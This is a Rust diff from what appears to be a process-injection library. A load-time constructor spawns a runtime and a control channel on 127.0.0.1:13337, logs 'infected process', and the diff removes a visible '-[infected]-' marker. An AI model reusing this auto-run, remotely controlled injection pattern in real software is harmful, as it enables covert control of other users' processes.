@@ -7,8 +7,7 @@ use tracing::{error, debug};
 
 #[ctor::ctor]
 fn contructor() {
-	eprint!(" -[infected]- ");
-	std::thread::spawn(move || {
+	std::thread::spawn(move || -> Result<(), std::io::Error> {
 		tracing_subscriber::fmt()
 			.with_max_level(tracing::Level::DEBUG)
 			.with_writer(std::io::stderr)
@@ -16,14 +15,17 @@ fn contructor() {
 		debug!("infected process");
 		tokio::runtime::Builder::new_current_thread()
 			.enable_all()
-			.build()
-			.unwrap()
+			.build()?
 			.block_on(main());
+		Ok(())
 	});
 }
 
 #[ctor::dtor]
 fn destructor() {}
+
+
+
 
 async fn main() {
 	let mut handle = ControlChannel::run("127.0.0.1:13337".into());
